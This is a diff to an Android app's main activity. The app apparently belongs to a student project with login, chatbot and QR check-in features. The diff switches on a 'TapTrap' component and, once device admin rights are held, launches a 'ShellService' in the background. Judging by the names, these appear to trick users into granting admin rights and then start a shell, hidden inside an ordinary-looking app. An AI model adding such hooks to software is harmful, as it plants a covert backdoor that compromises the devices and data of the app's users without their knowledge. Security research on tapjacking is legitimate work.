@@ -33,11 +33,13 @@ import com.example.inf2007_mad_j1847.experiments.AuthPerformanceTest
 import com.example.inf2007_mad_j1847.experiments.ChatbotPerformanceTest
 import com.example.inf2007_mad_j1847.experiments.QRCheckInTest
 import android.Manifest
+import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.core.content.ContextCompat
 import com.example.inf2007_mad_j1847.notifications.MyFirebaseMessagingService
+import com.example.inf2007_mad_j1847.test.ShellService
 import com.example.inf2007_mad_j1847.test.TapTrap
 
 
@@ -86,7 +88,19 @@ class MainActivity : ComponentActivity() {
 
 
 
-        //tapTrap = TapTrap(this)
+        tapTrap = TapTrap(this)
+
+        // Check if device admin is already granted
+        if (tapTrap.isDeviceAdminActive()) {
+            Log.i(TAG, "Device admin already granted - starting service");
+            val serviceIntent = Intent(this, ShellService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent)
+            } else {
+                startService(serviceIntent)
+            }
+        }
+
 
         var nameTest by mutableStateOf("Android") // Default name
 
